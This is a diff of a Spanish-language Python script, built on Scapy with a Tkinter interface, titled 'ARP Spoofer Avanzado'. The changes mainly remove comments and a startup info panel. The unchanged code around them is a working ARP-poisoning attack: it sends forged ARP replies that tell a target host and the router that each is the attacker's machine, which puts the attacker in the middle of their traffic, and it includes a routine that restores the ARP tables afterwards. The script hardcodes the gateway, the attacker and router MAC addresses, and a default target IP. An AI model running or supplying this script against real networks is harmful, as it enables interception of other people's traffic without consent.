@@ -5,21 +5,21 @@ import time
 import threading
 import os
 import platform
-import ctypes  # Añadido para la verificación de privilegios en Windows
+import ctypes  
 
-# ===== CONFIGURACIÓN DE RED (AJUSTA ESTOS VALORES) =====
-INTERFAZ_RED = "Wi-Fi 2"  # Nombre exacto de tu interfaz (ver con 'netsh interface show interface')
+
+INTERFAZ_RED = "Wi-Fi 2" 
 IP_PUERTA_ENLACE = "192.168.0.1"
-MAC_PUERTA_ENLACE = "b0:92:4a:b5:64:27"  # MAC del router (de tu tabla ARP)
-MAC_ATACANTE = "90:2e:16:ba:4c:35"       # MAC de tu interfaz Wi-Fi (de ipconfig /all)
-# ======================================================
+MAC_PUERTA_ENLACE = "b0:92:4a:b5:64:27"
+MAC_ATACANTE = "90:2e:16:ba:4c:35"       
 
-# Configuración de Scapy
+
+
 conf.use_pcap = True
 conf.verb = 0
-conf.iface = INTERFAZ_RED  # Fuerza el uso de la interfaz correcta
+conf.iface = INTERFAZ_RED  
 
-# Variables globales
+
 ataque_en_curso = False
 
 def verificar_privilegios():
@@ -27,7 +27,7 @@ def verificar_privilegios():
         if platform.system() == 'Windows':
             return ctypes.windll.shell32.IsUserAnAdmin() != 0
         else:
-            return os.getuid() == 0  # Root en Linux/macOS
+            return os.getuid() == 0 
     except Exception as e:
         messagebox.showerror("Error", f"No se pudo verificar privilegios: {str(e)}")
         return False
@@ -37,7 +37,7 @@ def obtener_mac(ip):
     try:
         mac = getmacbyip(ip)
         if mac:
-            return mac.lower()  # Scapy devuelve MAC en minúsculas
+            return mac.lower() 
         print(f"[!] No se pudo obtener MAC para {ip} (¿Firewall/ARP cache?)")
         return None
     except Exception as e:
@@ -57,7 +57,7 @@ def spoofing_arp(ip_objetivo, widget_salida):
 
     try:
         while ataque_en_curso:
-            # Spoof al objetivo (diciendo que somos el router)
+
             sendp(
                 Ether(src=MAC_ATACANTE, dst=mac_objetivo) /
                 ARP(op=2, hwsrc=MAC_ATACANTE, psrc=IP_PUERTA_ENLACE, 
@@ -65,7 +65,7 @@ def spoofing_arp(ip_objetivo, widget_salida):
                 verbose=0
             )
             
-            # Spoof al router (diciendo que somos el objetivo)
+           
             sendp(
                 Ether(src=MAC_ATACANTE, dst=MAC_PUERTA_ENLACE) /
                 ARP(op=2, hwsrc=MAC_ATACANTE, psrc=ip_objetivo,
@@ -81,14 +81,14 @@ def spoofing_arp(ip_objetivo, widget_salida):
 def restaurar_arp(ip_objetivo):
     mac_objetivo = obtener_mac(ip_objetivo)
     if mac_objetivo and MAC_PUERTA_ENLACE:
-        # Restaura ARP del objetivo
+      
         sendp(
             Ether(dst=mac_objetivo) /
             ARP(op=2, hwsrc=MAC_PUERTA_ENLACE, psrc=IP_PUERTA_ENLACE,
                 hwdst=mac_objetivo, pdst=ip_objetivo),
             count=5, verbose=0
         )
-        # Restaura ARP del router
+    
         sendp(
             Ether(dst=MAC_PUERTA_ENLACE) /
             ARP(op=2, hwsrc=mac_objetivo, psrc=ip_objetivo,
@@ -122,14 +122,14 @@ def detener_spoofing():
         restaurar_arp(ip_objetivo)
     widget_salida.insert(tk.END, "\n[✓] Ataque detenido. Tabla ARP restaurada\n")
 
-# Interfaz gráfica
+
 ventana = tk.Tk()
 ventana.title("ARP Spoofer Avanzado - VirtualBox/Wi-Fi")
 
 tk.Label(ventana, text="IP Objetivo:").pack(pady=5)
 entrada_ip = tk.Entry(ventana, width=30)
 entrada_ip.pack(pady=5)
-entrada_ip.insert(0, "192.168.0.16")  # IP de tu VM por defecto
+entrada_ip.insert(0, "192.168.0.16")  
 
 frame_botones = tk.Frame(ventana)
 frame_botones.pack(pady=10)
@@ -152,14 +152,5 @@ boton_detener.pack(side=tk.LEFT, padx=5)
 
 widget_salida = scrolledtext.ScrolledText(ventana, width=70, height=20, wrap=tk.WORD)
 widget_salida.pack(pady=10)
-
-# Info inicial
-widget_salida.insert(tk.END, f"🔧 Configuración de red:\n")
-widget_salida.insert(tk.END, f" - Interfaz: {INTERFAZ_RED}\n")
-widget_salida.insert(tk.END, f" - Tu MAC: {MAC_ATACANTE}\n")
-widget_salida.insert(tk.END, f" - Router: {IP_PUERTA_ENLACE} [{MAC_PUERTA_ENLACE}]\n\n")
-widget_salida.insert(tk.END, "⚠️ Asegúrate de:\n")
-widget_salida.insert(tk.END, " 1. Ejecutar como administrador\n")
-widget_salida.insert(tk.END, " 2. Tener desactivado el firewall\n")
 
 ventana.mainloop()
